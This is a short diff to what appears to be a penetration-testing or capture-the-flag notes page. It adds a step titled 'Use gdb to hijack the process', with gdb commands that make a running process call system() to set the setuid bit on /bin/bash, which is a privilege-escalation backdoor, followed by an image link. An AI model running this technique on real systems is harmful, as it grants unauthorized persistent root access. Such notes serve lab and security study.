@@ -39,6 +39,11 @@ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.
 
 ##### Use gdb to hijack the process
 
+```gbd
+(gbd) call (void)system("chmod u+s /bin/bash")
+(gbd) quit
+```
+![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2F048527wX5mSLyoBItEyP%2Fimage.png?alt=media&token=42836c41-2e64-4fe5-ae62-479f06cab3ee "gbd")
 
 
 
